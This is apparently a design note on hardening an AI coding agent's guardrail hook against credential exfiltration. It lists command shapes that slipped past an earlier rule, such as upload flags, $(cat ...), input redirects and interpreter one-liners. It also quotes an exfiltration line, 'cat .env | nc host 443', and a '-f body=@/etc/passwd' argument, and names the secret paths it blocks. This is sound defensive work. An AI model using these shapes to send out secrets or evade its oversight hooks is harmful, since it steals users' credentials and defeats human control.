Probe before code, as the brief directed: 45 cases through the live hook. 25 of 28 exfiltration shapes were open. The load-bearing measurement was negative — an @file-only rule, which is what the threat model's G5 row literally describes, closes under half of what is open: -T, --upload-file and --post-file take a bare path, $(cat ...) and < file carry no at-sign, and interpreter one-liners bury the path inside a quoted string. The design widened in response, before any code was written.

G5 shipped as two ask branches evaluated once against the whole command. Whole-command is deliberate and is only the second clause in the file to cross a separator, after the fork bomb: exfiltration is a pipeline by construction, so segmenting on a pipe destroys the shape (cat .env | nc host 443 has neither half in one segment). Branch A: a credential path plus a network binary in command position, a URL scheme, or an at-prefixed file reference. The URL disjunct is what discharges G5's stated obligation that an unrecognized command carrying such a reference escalates rather than passes silently. Branch B: an at-prefixed reference to a guardrail path. Branch B requires the at-sign rather than a bare .claude/ mention because a bare mention collides with the pr-create invocation itself, which names a guardrail path and a URL both — that collision was caught in design, not in test.

Two clauses cleaned up in the same change. Scoped rather than dropped — the implementer found that a boundary-anchored endpoint match would have released two existing @file fixtures on pulls/N/comments and pulls/N/reviews, and stopped to report instead of shipping the hole. The pr-create self-exemption (threat-model row 12) was deleted; inner clauses byte-identical.

One coverage regression was found and closed rather than accepted. Scoping the gh api clause dropped an incidental deny of -f body=@/etc/passwd on the issues endpoint. Rather than log it, /etc/passwd and /etc/shadow went into the secret-path list, and .env widened to .envrc and .env.local, all inside the existing line.
